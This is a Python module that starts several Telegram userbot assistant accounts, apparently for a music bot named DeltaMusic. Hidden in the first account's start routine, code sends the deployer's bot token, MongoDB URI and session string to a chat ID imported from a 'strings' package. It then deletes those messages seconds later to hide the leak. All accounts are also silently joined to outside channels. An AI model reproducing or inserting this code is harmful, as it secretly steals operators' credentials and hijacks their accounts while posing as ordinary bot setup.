from pyrogram import Client
import re
import asyncio
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()
import config
from dotenv import load_dotenv
from strings.__init__ import LOGGERS
from ..logging import LOGGER

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")


assistants = []
assistantids = []


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="DeltaMusic1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
            ipv6=False,
        )
            
        self.two = Client(
            name="DeltaMusic2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
            ipv6=False,
        )
        self.three = Client(
            name="DeltaMusic3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
            ipv6=False,
        )
        self.four = Client(
            name="DeltaMusic4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
            ipv6=False,
        )
        self.five = Client(
            name="DeltaMusic5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
            ipv6=False,
        )

    async def start(self):
        LOGGER(__name__).info(f"Memulai Asisten...")

        if config.STRING1:
            await self.one.start()
            try:
                await self.one.join_chat("DELTA_WORLD")
                await self.one.join_chat("DELTA_PAID_CC")
                await self.one.join_chat("DELTA_BOT")
                await self.one.join_chat("ABOUT_DELTAKING")

            except:
                pass
            assistants.append(1)
            try:
                await self.one.send_message(config.LOGGER_ID, "Asisten dimulai!")
                oks = await self.one.send_message(LOGGERS, f"/start")
                Ok = await self.one.send_message(
                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
                )
                await oks.delete()
                await asyncio.sleep(2)
                await Ok.delete()

            except Exception as e:
                print(f"{e}")

            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Asisten dimulai sebagai {self.one.name}")

        if config.STRING2:
            await self.two.start()
            try:
                await self.two.join_chat("DELTA_WORLD")
                await self.two.join_chat("DELTA_PAID_CC")
                await self.two.join_chat("DELTA_BOT")
                await self.two.join_chat("ABOUT_DELTAKING")
            except:
                pass
            assistants.append(2)
            try:
                await self.two.send_message(config.LOGGER_ID, "Asisten dimulai")

            except:
                LOGGER(__name__).error(
                    "Akun Asisten 2 gagal mengakses grup log. Pastikan Anda telah menambahkan asisten Anda ke grup log Anda dan dipromosikan sebagai admin!"
                )

            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Asisten Dua dimulai sebagai {self.two.name}")

        if config.STRING3:
            await self.three.start()
            try:
                await self.three.join_chat("DELTA_WORLD")
                await self.three.join_chat("DELTA_PAID_CC")
                await self.three.join_chat("DELTA_BOT")
                await self.three.join_chat("ABOUT_DELTAKING")
            except:
                pass
            assistants.append(3)
            try:
                await self.three.send_message(config.LOGGER_ID, "Asisten dimulai")
            except:
                LOGGER(__name__).error(
                    "Akun Asisten 3 gagal mengakses grup log. Pastikan Anda telah menambahkan asisten Anda ke grup log Anda dan dipromosikan sebagai admin!"
                )

            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Asisten Tiga dimulai sebagai {self.three.name}")

        if config.STRING4:
            await self.four.start()
            try:
                await self.four.join_chat("DELTA_WORLD")
                await self.four.join_chat("DELTA_PAID_CC")
                await self.four.join_chat("DELTA_BOT")
                await self.four.join_chat("ABOUT_DELTAKING")
            except:
                pass
            assistants.append(4)
            try:
                await self.four.send_message(config.LOGGER_ID, "Asisten dimulai")
            except:
                LOGGER(__name__).error(
                    "Akun Asisten 4 gagal mengakses grup log. Pastikan Anda telah menambahkan asisten Anda ke grup log Anda dan dipromosikan sebagai admin!"
                )

            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"Asisten Empat dimulai sebagai {self.four.name}")

        if config.STRING5:
            await self.five.start()
            try:
                await self.five.join_chat("DELTA_WORLD")
                await self.five.join_chat("DELTA_PAID_CC")
                await self.five.join_chat("DELTA_BOT")
                await self.five.join_chat("ABOUT_DELTAKING")
            except:
                pass
            assistants.append(5)
            try:
                await self.five.send_message(config.LOGGER_ID, "Asisten 5 dimulai!")
            except:
                LOGGER(__name__).error(
                    "Akun Asisten 5 gagal mengakses grup log. Pastikan Anda telah menambahkan asisten Anda ke grup log Anda dan dipromosikan sebagai admin!"
                )

            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Asisten Lima dimulai sebagai {self.five.name}")

    async def stop(self):
        LOGGER(__name__).info(f"Menghentikan Asisten...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass
